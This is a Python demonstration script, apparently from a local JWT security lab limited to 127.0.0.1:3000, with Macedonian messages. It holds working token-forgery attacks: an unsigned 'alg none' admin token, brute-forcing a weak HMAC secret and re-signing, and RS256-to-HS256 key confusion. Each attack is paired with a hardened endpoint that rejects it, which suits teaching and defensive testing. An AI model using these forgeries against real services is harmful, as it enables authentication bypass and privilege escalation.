"""Локални JWT демонстрации; намерно ограничени на 127.0.0.1:3000."""
import base64
import hashlib
import hmac
import json
import sys
import urllib.error
import urllib.request

BASE = 'http://127.0.0.1:3000'


def b64(value):
    if not isinstance(value, bytes):
        value = json.dumps(value, separators=(',', ':')).encode()
    return base64.urlsafe_b64encode(value).rstrip(b'=').decode()


def request(path, token=None, data=None):
    headers = {}
    if token:
        headers['Authorization'] = f'Bearer {token}'
    if data is not None:
        headers['Content-Type'] = 'application/json'
        data = json.dumps(data).encode()
    req = urllib.request.Request(BASE + path, headers=headers, data=data)
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.status, json.load(response)
    except urllib.error.HTTPError as error:
        return error.code, json.load(error)


def show(label, path, token):
    status, body = request(path, token)
    print(f'{label}: HTTP {status} — {json.dumps(body, ensure_ascii=False)}')
    return status


def sign_hs(payload, secret):
    message = f'{b64({"alg": "HS256", "typ": "JWT"})}.{b64(payload)}'
    digest = hmac.new(secret, message.encode(), hashlib.sha256).digest()
    return f'{message}.{b64(digest)}'


def none_attack():
    token = f'{b64({"alg": "none", "typ": "JWT"})}.{b64({"username": "attacker", "role": "admin"})}.'
    assert show('Ранлива /admin', '/admin', token) == 200
    assert show('Заштитена /admin-alg-safe', '/admin-alg-safe', token) == 401


def weak_attack():
    status, body = request('/login', data={'username': 'alice', 'password': 'demo-pass'})
    assert status == 200
    token = body['token']
    message, signature = token.rsplit('.', 1)
    guesses = ['password', '123456', 'secret', 'secret123', 'admin', 'qwerty']
    found = None
    for guess in guesses:
        candidate = b64(hmac.new(guess.encode(), message.encode(), hashlib.sha256).digest())
        if hmac.compare_digest(candidate, signature):
            found = guess
            break
    assert found == 'secret123'
    print(f'Пронајдена слаба тајна: {found!r} (обид {guesses.index(found) + 1})')
    forged = sign_hs({'username': 'attacker', 'role': 'admin'}, found.encode())
    assert show('Слаб клуч и фиксен алгоритам', '/admin-alg-safe', forged) == 200
    assert show('Силен клуч и фиксен алгоритам', '/admin-secret-safe', forged) == 401


def confusion_attack():
    status, body = request('/rsa-token')
    assert status == 200
    public_pem = body['publicKey'].encode()
    forged = sign_hs({'username': 'attacker', 'role': 'admin'}, public_pem)
    assert show('Ранлива /confusion-demo', '/confusion-demo', forged) == 200
    assert show('Заштитена /confusion-demo-safe', '/confusion-demo-safe', forged) == 401


if __name__ == '__main__':
    options = {'none': none_attack, 'weak': weak_attack, 'confusion': confusion_attack}
    if len(sys.argv) != 2 or sys.argv[1] not in {*options, 'all'}:
        sys.exit('Употреба: python3 attacks.py none|weak|confusion|all')
    if sys.argv[1] == 'all':
        for name, attack in options.items():
            print(f'\n--- {name} ---')
            attack()
    else:
        options[sys.argv[1]]()
